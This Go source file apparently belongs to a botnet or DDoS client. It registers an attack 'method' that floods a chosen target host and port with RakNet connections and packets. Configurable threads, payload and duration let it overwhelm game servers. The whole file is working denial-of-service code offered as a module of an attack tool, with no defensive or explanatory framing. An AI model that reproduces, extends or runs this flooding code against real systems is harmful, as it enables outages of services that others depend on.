package methodImpl

import (
	"client/core/modules/methods"
	"fmt"
	go_raknet "github.com/sandertv/go-raknet"
	"time"
)

func init() {
	methods.Make(&methods.Method{
		Id: 5,
		Executor: func(targets []string, port int, duration int, flags map[int]interface{}) error {
			start := time.Now()
			addr := fmt.Sprintf("%s:%d", randomChoice(targets), port)

			size, exists := flags[methods.FlagSize]
			if !exists {
				size = 1024
			}

			payload, exists := flags[methods.FlagPayload]
			if !exists {
				payload = ""
			}

			threads, exists := flags[methods.FlagThreads]
			if !exists {
				threads = 1
			}

			for i := 0; i < threads.(int); i++ {
				go func() {
					for time.Since(start) < time.Duration(duration)*time.Second {
						buf := make([]byte, size.(int))
						if len(payload.(string)) > 1 {
							buf = []byte(payload.(string))
						}

						conn, _ := go_raknet.Dial(addr)
						_, err := conn.Write(buf)
						if err != nil {
							continue
						}
					}
				}()
			}
			return nil
		},
	})
}
